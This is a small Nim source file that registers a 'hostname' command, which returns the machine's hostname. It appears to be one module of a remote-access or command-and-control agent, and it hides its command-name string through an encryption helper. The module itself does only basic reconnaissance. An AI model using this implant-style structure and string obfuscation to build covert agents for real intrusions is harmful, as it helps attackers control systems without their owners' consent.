import std/json
import core/types
import core/utils
import commands/registry
import crypto/strenc

proc hostnameExecute(taskId: string, params: JsonNode, state: AgentState,
                     send: SendMsg): TaskResult =
  return TaskResult(output: getHostname(), status: "success", completed: true)

proc initHostname*() =
  register(hidstr("hostname"), hostnameExecute)
